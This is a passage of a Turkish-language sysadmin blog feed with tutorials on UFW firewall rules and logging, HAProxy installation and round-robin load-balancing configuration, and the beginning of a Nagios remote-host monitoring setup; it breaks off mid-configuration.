&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;mustafa&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;altinkaynak&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="n"&gt;ufw&lt;/span&gt; &lt;span class="n"&gt;allow&lt;/span&gt; &lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="mf"&gt;10.50.1.55&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;any&lt;/span&gt; &lt;span class="n"&gt;port&lt;/span&gt; &lt;span class="mi"&gt;22&lt;/span&gt; &lt;span class="n"&gt;proto&lt;/span&gt; &lt;span class="n"&gt;tcp&lt;/span&gt;
&lt;span class="n"&gt;Rule&lt;/span&gt; &lt;span class="n"&gt;added&lt;/span&gt;

&lt;span class="n"&gt;mustafa&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;altinkaynak&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="n"&gt;ufw&lt;/span&gt; &lt;span class="n"&gt;allow&lt;/span&gt; &lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="mf"&gt;192.168.0.0&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;any&lt;/span&gt; &lt;span class="n"&gt;port&lt;/span&gt; &lt;span class="mi"&gt;22&lt;/span&gt; &lt;span class="n"&gt;proto&lt;/span&gt; &lt;span class="n"&gt;tcp&lt;/span&gt;
&lt;span class="n"&gt;Rule&lt;/span&gt; &lt;span class="n"&gt;added&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Kural kaldırma&lt;/h2&gt;
&lt;p&gt;UFW üzerinde kural kaldırmak için kural oluşturma sırasında yazmış olduğunuz koda delete eklemeniz yeterlidir.&lt;/p&gt;
&lt;p&gt;80.porta gelen bağlantıları engellemek için,
    mustafa@altinkaynak:/# ufw deny 80/tcp&lt;/p&gt;
&lt;p&gt;Belirlenen bu kuralı silmek için,&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;mustafa&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;altinkaynak&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="n"&gt;ufw&lt;/span&gt; &lt;span class="n"&gt;delete&lt;/span&gt; &lt;span class="n"&gt;deny&lt;/span&gt; &lt;span class="mi"&gt;53&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;udp&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Yada tüm kurallar içerisinden belirlemiş olduğunuzu silmek istiyorsanız öncelikle aşağıdaki komutla kuralları numaralandırılmış halde listeleyin, ardından silmek istediğiniz kuralın numarasını ufw delete komutuna vermeniz yeterlidir.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;mustafa&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;altinkaynak&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="n"&gt;ufw&lt;/span&gt; &lt;span class="n"&gt;status&lt;/span&gt; &lt;span class="n"&gt;numbered&lt;/span&gt;
&lt;span class="nl"&gt;Status:&lt;/span&gt; &lt;span class="n"&gt;active&lt;/span&gt;
&lt;span class="n"&gt;To&lt;/span&gt;                         &lt;span class="n"&gt;Action&lt;/span&gt;      &lt;span class="n"&gt;From&lt;/span&gt;
&lt;span class="o"&gt;--&lt;/span&gt;                         &lt;span class="o"&gt;------&lt;/span&gt;      &lt;span class="o"&gt;----&lt;/span&gt;
&lt;span class="p"&gt;[&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="mi"&gt;80&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tcp&lt;/span&gt;                     &lt;span class="n"&gt;DENY&lt;/span&gt; &lt;span class="n"&gt;IN&lt;/span&gt;     &lt;span class="n"&gt;Anywhere&lt;/span&gt;
&lt;span class="p"&gt;[&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="mi"&gt;80&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tcp&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;v6&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;                &lt;span class="n"&gt;DENY&lt;/span&gt; &lt;span class="n"&gt;IN&lt;/span&gt;     &lt;span class="n"&gt;Anywhere&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;v6&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="n"&gt;mustafa&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;altinkaynak&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="n"&gt;ufw&lt;/span&gt; &lt;span class="n"&gt;delete&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
&lt;span class="nl"&gt;Deleting:&lt;/span&gt;
 &lt;span class="n"&gt;deny&lt;/span&gt; &lt;span class="mi"&gt;80&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tcp&lt;/span&gt;
&lt;span class="n"&gt;Proceed&lt;/span&gt; &lt;span class="n"&gt;with&lt;/span&gt; &lt;span class="n"&gt;operation&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;?&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt;
&lt;span class="n"&gt;Rule&lt;/span&gt; &lt;span class="n"&gt;deleted&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Servisler için kural yazma&lt;/h2&gt;
&lt;p&gt;UFW /etc/services dosyasını da okuyabildiği için hizmet adına göre de izin verebilir veya reddedebilirsiniz. Servislerin listesini görmek için &lt;strong&gt;"/etc/services"&lt;/strong&gt; dosyasına göz atabilirsiniz.&lt;/p&gt;
&lt;p&gt;Servis ismiyle bağlantıya izin verilen kurallar aşağıdaki şekilde tanımlanabilir.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;ufw&lt;/span&gt; &lt;span class="n"&gt;allow&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;service&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;SSH servisine bağlantılara izin vermek için,&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;mustafa&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;altinkaynak&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="n"&gt;ufw&lt;/span&gt; &lt;span class="n"&gt;allow&lt;/span&gt; &lt;span class="n"&gt;ssh&lt;/span&gt;
&lt;span class="n"&gt;Rule&lt;/span&gt; &lt;span class="n"&gt;added&lt;/span&gt;
&lt;span class="n"&gt;Rule&lt;/span&gt; &lt;span class="n"&gt;added&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;v6&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Servis ismiyle bağlantının reddedildiği kurallar aşağıdaki şekilde tanımlanabilir.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;ufw&lt;/span&gt; &lt;span class="n"&gt;deny&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;service&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;SSH servisine bağlantıları reddetmek için,&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;mustafa&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;altinkaynak&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="n"&gt;ufw&lt;/span&gt; &lt;span class="n"&gt;deny&lt;/span&gt; &lt;span class="n"&gt;ssh&lt;/span&gt;
&lt;span class="n"&gt;Rule&lt;/span&gt; &lt;span class="n"&gt;added&lt;/span&gt;
&lt;span class="n"&gt;Rule&lt;/span&gt; &lt;span class="n"&gt;added&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;v6&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Loglama&lt;/h2&gt;
&lt;p&gt;UFW loglama için farklı bir değer belirtilmedikçe "low" yani düşük seviye loglama işlemi yapmaktadır. Loglama konusunda hassas davranmak istiyorsanız aşağıdaki komutu 'off', 'low', 'medium', 'high' ve 'full' değerleriyle birlikte kullanabilirsiniz.&lt;/p&gt;
&lt;p&gt;Log kaydetme seviyeleri yükseldikçe daha fazla çıktı üreterek, yoğunluğunuza göre diskinizi hızla doldurabilir. Production ortamlarda yapılacak olan seviye belirlemelerinde bunu göz önünde bulundurmalısınız.&lt;/p&gt;
&lt;p&gt;Loglama işlemini devre dışı bırakmak için,&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;mustafa&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;altinkaynak&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="n"&gt;ufw&lt;/span&gt; &lt;span class="n"&gt;logging&lt;/span&gt; &lt;span class="n"&gt;off&lt;/span&gt;
&lt;span class="n"&gt;Logging&lt;/span&gt; &lt;span class="n"&gt;disabled&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En yüksek düzeyde loglama gerçekleştirmek için,&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;mustafa&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;altinkaynak&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="n"&gt;ufw&lt;/span&gt; &lt;span class="n"&gt;logging&lt;/span&gt; &lt;span class="n"&gt;full&lt;/span&gt;
&lt;span class="n"&gt;Logging&lt;/span&gt; &lt;span class="n"&gt;enabled&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Loglama işlemini tamamiyle devre dışı bırakmak için,&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;mustafa&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;altinkaynak&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="n"&gt;ufw&lt;/span&gt; &lt;span class="n"&gt;logging&lt;/span&gt; &lt;span class="n"&gt;off&lt;/span&gt;
&lt;span class="n"&gt;Logging&lt;/span&gt; &lt;span class="n"&gt;disabled&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Bir sonraki yazımda görüşmek dileğiyle.&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">admin</dc:creator><pubDate>Thu, 22 Dec 2016 10:00:00 +0200</pubDate><guid>tag:,2016-12-22:ufw-kurulumu-ve-yapilandirma.html</guid><category>ufw kurulumu ve yapılandırma</category><category>ufw nedir</category><category>ufw ubuntu</category><category>ufw debian</category></item><item><title>HAProxy Kurulumu ve Yapılandırma</title><link>/haproxy-kurulumu-ve-yapilandirma.html</link><description>&lt;h2&gt;HAProxy nedir?&lt;/h2&gt;
&lt;p&gt;HAProxy (High Availability Proxy), bir yük dengeleme görev yöneticisidir. Birçok servis için yük dengeleme, yüksek erişilebilirlik ve proxy gibi hizmetleri ücretsiz, güvenli olarak sunmaktadır. Stabil versiyonu 1.6'dır.&lt;/p&gt;
&lt;p&gt;Bu yazı da ise Ubuntu üzerine HAProxy 1.4.24 kurulumu gerçekleştirerek aşağıda yer alan yapıyı oluşturacağız.&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="assets/images/haproxy-yapi.png" /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;HAProxy sunucusu:&lt;/strong&gt; 192.168.1.200&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Webserver 1:&lt;/strong&gt; 192.168.1.201&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Webserver 2:&lt;/strong&gt; 192.168.1.202&lt;/p&gt;
&lt;p&gt;Tüm sunuculara web server kurulumunu gerçekleştirdim.&lt;/p&gt;
&lt;h2&gt;HAProxy kurulumu&lt;/h2&gt;
&lt;p&gt;Ubuntu deposunda tanımlı olduğundan dolayı direkt apt-get ile kurabilirsiniz.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;mustafa&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;altinkaynak&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="n"&gt;apt&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt; &lt;span class="n"&gt;install&lt;/span&gt; &lt;span class="n"&gt;haproxy&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Kurulum işleminin ardından aşağıdaki komut ile birlikte versiyon kontrolü sağlayabilirsiniz.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;mustafa&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;altinkaynak&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="n"&gt;haproxy&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;
&lt;span class="n"&gt;HA&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;Proxy&lt;/span&gt; &lt;span class="n"&gt;version&lt;/span&gt; &lt;span class="mf"&gt;1.4.24&lt;/span&gt; &lt;span class="mi"&gt;2013&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mo"&gt;06&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;17&lt;/span&gt;
&lt;span class="n"&gt;Copyright&lt;/span&gt; &lt;span class="mi"&gt;2000&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;2013&lt;/span&gt; &lt;span class="n"&gt;Willy&lt;/span&gt; &lt;span class="n"&gt;Tarreau&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;w&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="n"&gt;wt&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;eu&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;HAProxy'i etkinleştirmek için /etc/default/haproxy dosyasında yer alan ENABLED değerini 1 olarak değiştirmeniz gerekmektedir.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;ENABLED&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Artık HAProxy servisi için etkinlikler geldi.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;mustafa&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;altinkaynak&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="n"&gt;service&lt;/span&gt; &lt;span class="n"&gt;haproxy&lt;/span&gt;
&lt;span class="nl"&gt;Usage:&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;etc&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;init&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;haproxy&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="n"&gt;start&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;stop&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;reload&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;restart&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;status&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;HAProxy yapılandırma&lt;/h2&gt;
&lt;p&gt;Herşeye başlamadan önce mevcut HAProxy konfigurasyon dosyasını yedekleyelim.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;mv&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;etc&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;haproxy&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;haproxy&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;cfg&lt;/span&gt;&lt;span class="p"&gt;{,.&lt;/span&gt;&lt;span class="n"&gt;original&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Artık &lt;strong&gt;haproxy.cfg&lt;/strong&gt; adında yeni bir konfigurasyon dosyası oluşturarak burada işlem gerçekleştirelim.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;global&lt;/span&gt;
        &lt;span class="n"&gt;log&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;dev&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;log&lt;/span&gt;   &lt;span class="n"&gt;local0&lt;/span&gt;
        &lt;span class="n"&gt;log&lt;/span&gt; &lt;span class="mf"&gt;127.0.0.1&lt;/span&gt;   &lt;span class="n"&gt;local1&lt;/span&gt; &lt;span class="n"&gt;notice&lt;/span&gt;
        &lt;span class="n"&gt;maxconn&lt;/span&gt; &lt;span class="mi"&gt;4096&lt;/span&gt;
        &lt;span class="n"&gt;user&lt;/span&gt; &lt;span class="n"&gt;haproxy&lt;/span&gt;
        &lt;span class="n"&gt;group&lt;/span&gt; &lt;span class="n"&gt;haproxy&lt;/span&gt;
        &lt;span class="n"&gt;daemon&lt;/span&gt;

&lt;span class="n"&gt;defaults&lt;/span&gt;
        &lt;span class="n"&gt;log&lt;/span&gt;     &lt;span class="n"&gt;global&lt;/span&gt;
        &lt;span class="n"&gt;mode&lt;/span&gt;    &lt;span class="n"&gt;http&lt;/span&gt;
        &lt;span class="n"&gt;option&lt;/span&gt;  &lt;span class="n"&gt;httplog&lt;/span&gt;
        &lt;span class="n"&gt;option&lt;/span&gt;  &lt;span class="n"&gt;dontlognull&lt;/span&gt;
        &lt;span class="n"&gt;retries&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;
        &lt;span class="n"&gt;option&lt;/span&gt; &lt;span class="n"&gt;redispatch&lt;/span&gt;
        &lt;span class="n"&gt;maxconn&lt;/span&gt; &lt;span class="mi"&gt;2000&lt;/span&gt;
        &lt;span class="n"&gt;contimeout&lt;/span&gt;     &lt;span class="mi"&gt;5000&lt;/span&gt;
        &lt;span class="n"&gt;clitimeout&lt;/span&gt;     &lt;span class="mi"&gt;50000&lt;/span&gt;
        &lt;span class="n"&gt;srvtimeout&lt;/span&gt;     &lt;span class="mi"&gt;50000&lt;/span&gt;

&lt;span class="n"&gt;listen&lt;/span&gt; &lt;span class="n"&gt;altinkaynak&lt;/span&gt; &lt;span class="mf"&gt;127.0.0.1&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;80&lt;/span&gt;
    &lt;span class="n"&gt;mode&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;
    &lt;span class="n"&gt;stats&lt;/span&gt; &lt;span class="n"&gt;enable&lt;/span&gt;
    &lt;span class="n"&gt;stats&lt;/span&gt; &lt;span class="n"&gt;uri&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;haproxy&lt;/span&gt;&lt;span class="o"&gt;?&lt;/span&gt;&lt;span class="n"&gt;stats&lt;/span&gt;
    &lt;span class="n"&gt;balance&lt;/span&gt; &lt;span class="n"&gt;roundrobin&lt;/span&gt;
    &lt;span class="n"&gt;option&lt;/span&gt; &lt;span class="n"&gt;httpclose&lt;/span&gt;
    &lt;span class="n"&gt;option&lt;/span&gt; &lt;span class="n"&gt;forwardfor&lt;/span&gt;
    &lt;span class="n"&gt;server&lt;/span&gt; &lt;span class="n"&gt;webserver01&lt;/span&gt; &lt;span class="mf"&gt;192.168.1.201&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;80&lt;/span&gt; &lt;span class="n"&gt;check&lt;/span&gt;
    &lt;span class="n"&gt;server&lt;/span&gt; &lt;span class="n"&gt;webserver02&lt;/span&gt; &lt;span class="mf"&gt;192.168.1.202&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;80&lt;/span&gt; &lt;span class="n"&gt;check&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Bu sürüm için geçerli konfigurasyon açıklamasına &lt;a href="http://www.haproxy.org/download/1.4/doc/configuration.txt"&gt;buradan&lt;/a&gt; ulaşabilirsiniz.&lt;/p&gt;
&lt;p&gt;Şimdi HAProxy dashboard sayfamıza göz atalım. Aşağıdaki göreceğiz üzere tüm servislerimiz yerlerini almış ve UP/DOWN durumları zamansal olarak gösterilmiştir. Servisler üzerinde açılan session sayısını da görebilmekteyiz.&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="assets/images/haproxy-dashboard.png" /&gt;&lt;/p&gt;
&lt;p&gt;Sunucuların up/down durumlarında e-posta bildirimi almak isteyebilirsiniz. O zaman güzel bir haber vereyim. HAProxy 1.6 sürümünde bildirim desteği gelmiştir. Ancak 1.4 sürümünde olmadığından dolayı bu yazıda yer veremiyorum.&lt;/p&gt;
&lt;p&gt;HAProxy'in bize sunmuş olduğu yük dengelemeyi de test edelim. Artık tüm trafiği HAProxy sunucusu üzerine (192.168.1.200) üzerine yönlendiriyoruz. Ben farkı anlayabilmek açısından giriş sayfalarına hangi sunucuya bağlantı yaptığımı yazdırdım.&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="assets/images/sunucular.png" /&gt;&lt;/p&gt;
&lt;p&gt;Sonuç olarak HAProxy en uygun olan sunucuya beni yönlendirdi.&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">admin</dc:creator><pubDate>Sat, 24 Sep 2016 23:34:00 +0300</pubDate><guid>tag:,2016-09-24:haproxy-kurulumu-ve-yapilandirma.html</guid><category>haproxy kurulumu</category></item><item><title>Nagios Uzak Sunucu Ekleme</title><link>/nagios-uzak-sunucu-ekleme.html</link><description>&lt;p&gt;&lt;strong&gt;Nagios&lt;/strong&gt; ağ üzerinde bulunan sistemleri monitör etmek için kullanılan bir yazılım olduğunu bir önceki yazılarımda ifade etmiştim. Şimdi nagios üzerine uzak bir sunucuyu kontrol etmek için görev (host, servis) tanımlayalım.&lt;/p&gt;
&lt;p&gt;Bu yazı da www.mustafa.com.tr adresi için HTTP ve SSH servislerini belirli zaman aralıklarında kontrol etmesini sağlayacağım.&lt;/p&gt;
&lt;h2&gt;Host ve servis tanımlama&lt;/h2&gt;
&lt;p&gt;/etc/nagios3/conf.d dizini altına giderek hostadi_nagios2.cfg adında bir dosya oluşturalım.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;define&lt;/span&gt; &lt;span class="n"&gt;host&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="n"&gt;use&lt;/span&gt;                    &lt;span class="n"&gt;generic&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;host&lt;/span&gt;
   &lt;span class="n"&gt;host_name&lt;/span&gt;              &lt;span class="n"&gt;mustafa&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;tr&lt;/span&gt;
   &lt;span class="n"&gt;alias&lt;/span&gt;                  &lt;span class="n"&gt;mustafa&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;tr&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="n"&gt;define&lt;/span&gt; &lt;span class="n"&gt;service&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="n"&gt;use&lt;/span&gt;                            &lt;span class="n"&gt;generic&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;service&lt;/span&gt;         &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;Name&lt;/span&gt; &lt;span class="n"&gt;of&lt;/span&gt; &lt;span class="n"&gt;service&lt;/span&gt; &lt;span class="n"&gt;template&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;use&lt;/span&gt;
   &lt;span class="n"&gt;host_name&lt;/span&gt;                       &lt;span class="n"&gt;mustafa&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;tr&lt;/span&gt;
   &lt;span class="n"&gt;service_description&lt;/span&gt;             &lt;span class="n"&gt;HTTP&lt;/span&gt;
   &lt;span class="n"&gt;normal_check_interval&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;
   &lt;span class="n"&gt;retry_check_interval&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
   &lt;span class="n"&gt;flap_detection_enabled&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
   &lt;span class="n"&gt;max_check_attempts&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;
   &lt;span class="n"&gt;check_command&lt;/span&gt;                   &lt;span class="n"&gt;check_http&lt;/span&gt;
   &lt;span class="n"&gt;notifications_enabled&lt;/span&gt;           &lt;span class="mi"&gt;1&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="n"&gt;define&lt;/span&gt; &lt;span class="n"&gt;service&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;use&lt;/span&gt;                             &lt;span class="n"&gt;generic&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;service&lt;/span&gt;
    &lt;span class="n"&gt;host_name&lt;/span&gt;                       &lt;span class="n"&gt;mustafa&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;tr&lt;/span&gt;
    &lt;span class="n"&gt;service_description&lt;/span&gt;             &lt;span class="n"&gt;SSH&lt;/span&gt;
